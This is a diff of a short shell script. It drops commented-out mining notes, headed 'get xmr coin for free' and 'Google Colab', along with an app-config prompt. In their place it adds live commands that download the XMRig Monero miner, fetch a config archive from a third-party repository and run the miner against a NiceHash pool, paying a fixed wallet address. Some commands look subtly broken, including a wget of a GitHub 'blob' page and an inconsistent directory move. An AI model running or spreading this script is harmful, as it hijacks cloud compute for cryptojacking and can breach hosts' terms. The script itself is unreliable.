@@ -1,19 +1,9 @@
-#! /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-#sudo apt update
-#sudo apt install screen
-#screen -R xmr
-#wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
-#tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
-#cd xmrig-6.16.4
-#./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash -a rx/0
-
-#sudo apt update
-#sudo apt install jq
-#touch process.json
-#jq -n --arg "$mydata" '{ "autosave": true, "cpu": true, "opencl": false, "cuda": false, "pools": [ { "coin": null, "algo": "rx/0", "url": "stratum+tcp://randomxmonero.eu-west.nicehash.com:3380", "user": "35qheUaRktAzmvTyBdpzih4moF5E3yDb6K", "pass": "x", "tls": false, "keepalive": true, "nicehash": true } ] }' > process.json
-echo -e "Name of your app?\n"
-read appname
-cat "{apps:[{name:\"${appname}\",script:\"./cms/bin/www\",watch:false}]}" > process.json
+sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+wget https://github.com/MahirAlam/rdps/blob/main/config.tar.gz
+tar xvzf config.tar.gz
+cd 0189834001650386722
+mv -i config.json ./xmrig-6.17.0
+./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash --coin monero -a rx/0
